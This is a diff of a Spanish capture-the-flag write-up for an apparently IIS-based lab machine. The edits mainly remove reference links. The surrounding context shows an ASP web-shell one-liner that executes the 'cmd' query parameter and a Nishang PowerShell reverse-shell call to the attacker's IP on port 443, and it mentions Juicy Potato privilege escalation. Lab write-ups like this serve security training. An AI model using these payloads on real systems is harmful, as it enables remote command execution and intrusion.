@@ -525,9 +525,7 @@ Invoke-PowerShellTcp.ps1          100%[=========================================
 Invoke-PowerShellTcp -Reverse -IPAddress Tu_IP -Port 443
 ```
 
-* Ahora vamos a cambiar el **web.config**, entrando al siguiente blog, encontraremos un oneliner que nos ayudara a cargar el Payload: <a href="https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html" target="_blank">Reverse Shells/ Web Shells Cheat sheet for Penetration Testing | OSCP</a>
-
-* El oneliner será el de **ASP**, ya que ese indica el archivo:
+* Ahora vamos a cambiar el **web.config**. El siguiente oneliner de **ASP** nos ayudara, ya que ese indica el archivo:
 ```powershell
 <%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
 ```
@@ -804,8 +802,7 @@ C:\Users\Administrator\Desktop>type root.txt
 ```
 Y con esto ya tendremos la máquina terminada.
 
-Te comparto estos links sobre cómo usar el **Juicy Potato**:
-* <a href="https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato" target="_blank">Juicy Potato - Using the juicy potato exploit for privilege escalation</a>
+Te comparto este link sobre cómo usar el **Juicy Potato**:
 * <a href="https://infinitelogins.com/2020/12/09/windows-privilege-escalation-abusing-seimpersonateprivilege-juicy-potato/" target="_blank">Windows Privilege Escalation: Abusing SeImpersonatePrivilege with Juicy Potato</a>
 
 
@@ -820,7 +817,6 @@ Te comparto estos links sobre cómo usar el **Juicy Potato**:
 * https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services
 * https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/
 * https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
-* https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html
 * https://github.com/ohpe/juicy-potato/releases/tag/v0.1
 * https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato
 * https://infinitelogins.com/2020/12/09/windows-privilege-escalation-abusing-seimpersonateprivilege-juicy-potato/
